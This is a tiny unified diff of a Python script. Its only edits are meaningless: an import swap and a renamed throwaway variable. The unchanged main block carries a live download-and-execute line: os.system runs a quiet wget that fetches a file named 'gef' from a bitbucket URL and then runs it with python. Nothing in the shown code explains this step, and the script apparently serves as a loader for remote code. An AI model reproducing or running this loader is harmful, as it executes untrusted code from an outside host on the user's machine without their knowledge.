@@ -1,4 +1,4 @@
-import os, sys,itertools
-v=2
+import os, sys,difflib
+t=8
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
